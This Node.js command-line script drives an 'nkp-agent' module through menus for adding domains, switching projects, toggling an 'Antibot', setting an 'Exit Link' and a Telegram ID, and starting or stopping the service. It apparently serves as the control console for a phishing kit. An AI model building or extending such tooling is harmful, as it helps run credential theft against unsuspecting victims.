const fs = require('fs')
const path = require('path')
const inquirer = require('inquirer')
const dotenv = require('dotenv')

dotenv.config({path: path.join(__dirname, '../.env')});


const nkpAgent = require('./lib/nkp-agent')


const questionList = [
   
    {
        type: 'list',
        message: 'Select an ACTION To Perform',
        name: 'action',
        choices: [
        // new inquirer.Separator('-------Domain-------'),
        "Get Information",
        "Get Traffic",
                // new inquirer.Separator('-------Domain-------'),

        "Add Domain",
        "Delete Domain",
        "Get All Domains",
        "Get All Links",
        // new inquirer.Separator('-------Projects-------'),
        "Get All Projects",
        "Change Project",
        // new inquirer.Separator('-------Antibot-------'),
        "On Antibot",
        "Off Antibot",
        // new inquirer.Separator('-------Process-------'),
        "Set Exit Link",
        "Set Telegram ID",
        // "Off Proxy",
        // "On Proxy",
        "Start nkp",
        "Stop nkp",
        
        ]

    },
    {
        type: 'input',
        message: 'Enter Domain Name:',
        name: 'domainAction',
        when(answerList) {
            return ["Add Domain", "Delete Domain"].includes(answerList.action)
        }
    },

    {
        type: 'input',
        message: 'Enter Project Name:',
        name: 'projectAction',
        when(answerList) {
            return answerList.action === 'Change Project'
        }
    },

    {
        type: 'input',
        message: 'Enter Antibot URL;Key:',
        name: 'antibotInfo',
        when(answerList) {
            return answerList.action  === "On Antibot"
        }
    },
    {
        type: 'input',
        message: 'Enter Telegram ID:',
        name: 'telegramInfo',
        when(answerList) {
            return answerList.action  === "Set Telegram ID"
        }
    },
    {
        type: 'input',
        message: 'Enter Exit Link:',
        name: 'exitLink',
        when(answerList) {
            return answerList.action  === "Set Exit Link"
        }
    },
]




inquirer
  .prompt(questionList)
  .then((answerList => {

    console.log('\n')
      switch(answerList.action) {
            case "Get Information":
                return nkpAgent.getInformation((success, appInfo) => {
                    if (success) {
                        console.log(`SERVER INFO:\n\n ${appInfo}`)
                    } else {
                        console.error(`Error failed to Execute command.\n Error: ${appInfo}`)

                    }
                })
            case "Get Traffic":
                return nkpAgent.getTraffic((success, appInfo) => {
                    if (success) {
                        console.log(`TRAFFIC INFO:\n\n ${appInfo}`)
                    } else {
                        console.error(`Error failed to Execute command.\n Error: ${appInfo}`)

                    }
                })
            case 'Add Domain':

                return nkpAgent.addDomain(answerList.domainAction.trim(), (success, appInfo) => {
                    if (success) {
                        console.log(`Added Domain: ${appInfo} to the server, you can use now..`)
                    } else {
                        console.error(`Error failed to Execute command.\n Error: ${appInfo}`)

                    }
                })
            case 'Delete Domain':
                return nkpAgent.deleteDomain(answerList.domainAction.trim(), (success, appInfo) => {
                    if (success) {
                        console.log(`Successfully Deleted domain: ${appInfo}`)
                    } else {
                        console.error(`Error failed to Execute command.\n Error: ${appInfo}`)

                    }
                })

            case "Get All Domains":
                return nkpAgent.getDomains((success, appInfo) => {
                    if (success) {
                        console.log(appInfo)
                    } else {
                        console.error(`Error failed to Execute command.\n Error: ${appInfo}`)
                    }
                })
            case "Get All Links":
                return nkpAgent.getLinks((success, appInfo) => {
                    if (success) {
                        console.log(appInfo)
                    } else {
                        console.error(`Error failed to Execute command.\n Error: ${appInfo}`)

                    }
                })

            case "Get All Projects":
                return nkpAgent.getProjects((success, appInfo) => {
                    if (success) {
                        console.log(appInfo)
                    } else {
                        console.error(`Error failed to Execute command.\n Error: ${appInfo}`)

                    }
                })
            case "Change Project":
                const projectName = answerList.projectAction
                return nkpAgent.changeProject(projectName, (success, appInfo) => {
                    if (success) {
                        console.log(`Successfully Changed Project to: ${projectName}, All is OK!`)
                    } else {
                        console.error(`Error failed to Execute command.\n Error: ${appInfo}`)

                    }
                })
            
            case "On Antibot":
            case "Off Antibot":
                let antibotInfo = 'null;null'
                const antibotSwitch = answerList.action === 'On Antibot'? true : false
                if (antibotSwitch) {
                    antibotInfo = answerList.antibotInfo
                }
                return nkpAgent.switchAntibot(antibotSwitch, antibotInfo, (success, appInfo) => {
                    if (success) {
                        console.log(`Successfully Changed Anitbot TO ${antibotSwitch}, All is OK!`)
                    } else {
                        console.error(`Error failed to Execute command.\n Error: ${appInfo}`)

                    }
                })

            case "Set Telegram ID":
                const telegramID = answerList.telegramInfo
                return nkpAgent.setTelegramID(telegramID, (success, appInfo) => {
                    if (success) {
                        console.log(`Successfully Changed TelegramID to: ${telegramID}, All is OK!`)
                    } else {
                        console.error(`Error failed to Execute command.\n Error: ${appInfo}`)

                    }
                })
            case "Set Exit Link":
                const exitLink = answerList.exitLink
                return nkpAgent.setExitLink(exitLink, (success, appInfo) => {
                    if (success) {
                        console.log(`Successfully Changed Exit Link to: ${exitLink}, All is OK!`)
                    } else {
                        console.error(`Error failed to Execute command.\n Error: ${appInfo}`)

                    }
                })
            case "Start nkp":
            case "Stop nkp":
                const action = answerList.action === 'Start nkp'? 'START' : 'STOP'

                return nkpAgent.changeState(action, (success, appInfo) => {
                    if (success) {
                        console.log(`Successfully ${action}ED nkp, All is OK!`)
                    } else {
                        console.error(`Error failed to Execute command.\n Error: ${appInfo}`)
                    }
                })
            default:
                console.error('Could not understand command')

      }

  }))